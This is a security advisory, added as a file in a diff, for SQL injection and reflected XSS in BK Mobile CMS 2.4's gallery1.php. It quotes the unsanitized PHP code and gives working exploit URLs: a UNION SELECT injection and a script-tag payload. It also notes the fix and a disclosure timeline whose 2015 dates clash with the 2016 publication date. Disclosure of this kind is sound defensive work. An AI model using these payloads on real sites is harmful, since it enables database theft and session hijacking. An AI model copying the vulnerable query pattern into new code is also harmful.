@@ -1,0 +1,98 @@
+#Product : BK Mobile CMS
+#Exploit Author : Rahul Pratap Singh
+#Version : 2.4
+#Home page Link :
+http://codecanyon.net/item/jquery-mobile-website-with-full-admin-panel/2441358
+#Website : 0x62626262.wordpress.com
+#Linkedin : https://in.linkedin.com/in/rahulpratapsingh94
+#Date : 27/Jan/2016
+
+SQLi Vulnerability:
+
+----------------------------------------
+Description:
+----------------------------------------
+"g_name" parameter is not sanitized that leads to SQL Injection.
+
+----------------------------------------
+Vulnerable Code:
+----------------------------------------
+file: gallery1.php
+line 5
+
+$get_g_name = $_GET['g_name'];
+$query_photos = "SELECT * FROM ".$get_prefix."photos WHERE
+gallery_name='".$get_g_name."' ORDER BY id DESC";
+
+----------------------------------------
+Exploit:
+----------------------------------------
+http://localhost/BKMobile%20CMS/user/gallery1.php?g_name=1%27%20union%20all%20select%201,2,3,group_concat%28version%28%29%29,5--+
+
+----------------------------------------
+POC:
+----------------------------------------
+https://0x62626262.files.wordpress.com/2016/01/bk-mobile-templatesqlipoc.png
+
+
+XSS Vulnerability:
+
+----------------------------------------
+Description:
+----------------------------------------
+"g_name" parameter is not sanitized that leads to reflected XSS.
+
+----------------------------------------
+Vulnerable Code:
+----------------------------------------
+file: gallery1.php
+
+line 81-88
+
+<div data-role="page" id="<?php echo $get_g_name; ?>" class="jqm-demos"
+<?php echo $custom_bg_active; ?>>
+
+<?php include("../header.php"); ?>
+
+<div role="main" class="ui-content">
+
+<div class="jqm-block-content">
+<h3><?php echo $_GET['g_name']; ?></h3>
+
+----------------------------------------
+Exploit:
+----------------------------------------
+http://localhost/BKMobile%20CMS/user/gallery1.php?g_name=%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E
+
+----------------------------------------
+POC:
+----------------------------------------
+https://0x62626262.files.wordpress.com/2016/01/bk-mobile-templatexsspoc.png
+
+Fix:
+Update to 2.5
+
+Vulnerability Disclosure Timeline:
+→ January 14, 2015 – Bug discovered, initial report to Vendor
+→ January 14, 2015 – Vendor acknowledged
+→ January 19, 2015 – Vendor Deployed a Patch
+
+#######################################
+# CTG SECURITY SOLUTIONS #
+# www.ctgsecuritysolutions.com #
+#######################################
+
+Pub Ref:
+https://0x62626262.wordpress.com/2016/01/27/bk-mobile-cms-sqli-and-xss-vulnerability
+http://codecanyon.net/item/jquery-mobile-website-with-full-admin-panel/2441358
+
+[+] Disclaimer
+
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
